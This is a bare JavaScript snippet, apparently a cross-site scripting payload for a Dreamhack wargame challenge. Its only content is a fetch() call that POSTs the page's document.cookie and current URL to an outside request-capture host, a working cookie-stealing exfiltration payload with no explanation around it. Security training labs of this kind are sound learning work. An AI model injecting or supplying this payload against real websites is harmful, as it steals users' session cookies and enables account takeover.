fetch('https://ovcyjip.request.dreamhack.games', {
  method: 'POST',
  mode: 'no-cors',
  body: JSON.stringify({cookie: document.cookie, url: location.href})
});
